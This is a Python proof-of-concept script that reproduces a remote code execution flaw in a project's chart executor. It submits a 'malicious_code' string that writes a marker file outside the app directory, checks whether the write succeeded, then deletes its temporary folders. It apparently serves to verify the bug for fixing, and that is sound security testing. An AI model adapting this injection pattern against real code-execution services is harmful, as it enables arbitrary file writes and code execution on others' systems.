import shutil
import subprocess
from pathlib import Path
from typing import Any, Dict

import sys
import os
sys.path.append(os.getcwd())

from services.api.chart_executor import execute_chart_exec

def reproduce_chart_rce():
    print("--- Starting Reproduction of Remote Code Execution in Chart Executor ---")
    
    # Setup directories (Absolute paths)
    base_dir = Path("./tmp_repro_chart_rce").resolve()
    if base_dir.exists():
        shutil.rmtree(base_dir)
    base_dir.mkdir()
    
    uploads_dir = base_dir / "uploads"
    app_root = base_dir / "app"
    app_root.mkdir()
    uploads_dir.mkdir()
    (uploads_dir / "charts").mkdir()
    (uploads_dir / "chart_runs").mkdir()
    
    # Target file to create via RCE
    # Since we run with cwd=app_root, creating "../pwned.txt" should put it in base_dir
    target_file = base_dir / "pwned.txt"
    
    # Malicious Python code
    malicious_code = """
import os
# We are in app_root.
# We want to write to base_dir/pwned.txt
# app_root is base_dir/app
# so ../pwned.txt is correct.
try:
    with open('../pwned.txt', 'w') as f:
        f.write('RCE SUCCESS')
except Exception as e:
    print(f"RCE failed: {e}")
"""
    
    args = {
        "python_code": malicious_code,
        "timeout_sec": 10,
        "max_retries": 1,
        "auto_install": False, 
        "packages": [],
        "save_as": "chart.png",
        "input_data": {}
    }
    
    print(f"Executing malicious code via chart_executor...")
    
    try:
        result = execute_chart_exec(args, app_root, uploads_dir)
        
        print("Execution finished.")
        print(f"Result ok: {result.get('ok')}")
        print(f"Stdout: {result.get('stdout')}")
        print(f"Stderr: {result.get('stderr')}")
        
        if target_file.exists():
            content = target_file.read_text()
            if content == "RCE SUCCESS":
                print("[CRITICAL] RCE Vulnerability Reproduced: Arbitrary file write executed!")
            else:
                print(f"[INFO] File created but content mismatch: {content}")
        else:
            print("[INFO] Target file not created. RCE might have failed.")
            
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # Cleanup
        if base_dir.exists():
            shutil.rmtree(base_dir)

if __name__ == "__main__":
    reproduce_chart_rce()